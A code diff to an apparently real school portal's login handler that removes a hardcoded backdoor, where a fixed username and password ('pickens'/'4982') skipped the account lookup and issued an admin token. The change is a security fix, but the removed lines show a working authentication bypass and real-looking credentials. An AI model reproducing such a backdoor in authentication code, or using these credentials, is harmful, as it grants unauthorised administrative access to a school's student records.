@@ -143,33 +143,6 @@ async function login(req, res) {
       student = lecturerRows[0];
     }
 
-    if (identifier.toLowerCase() === 'pickens' && password === '4982') {
-      const adminStudent = {
-        id: 0,
-        name: 'Administrator',
-        username: 'pickens',
-        email: 'admin@cresenthighschool.com',
-        admission_number: 'ADMIN',
-        role: 'admin',
-        class_name: 'Administration',
-        stream: null,
-        avatar: null,
-        active: 1,
-        last_login: new Date()
-      };
-      await logActivity(0, 'login', 'Successful admin login', req.ip);
-      return res.cookie('authToken', signToken(adminStudent), {
-        httpOnly: true,
-        sameSite: 'lax',
-        secure: process.env.NODE_ENV === 'production',
-        maxAge: 7 * 24 * 60 * 60 * 1000
-      }).json({
-        success: true,
-        token: signToken(adminStudent),
-        student: publicStudent(adminStudent)
-      });
-    }
-
     if (!student || !student.active) {
       await logActivity(null, 'failed_login', `Invalid login identifier: ${identifier}`, req.ip);
       return res.status(401).json({ success: false, message: 'Invalid login details' });
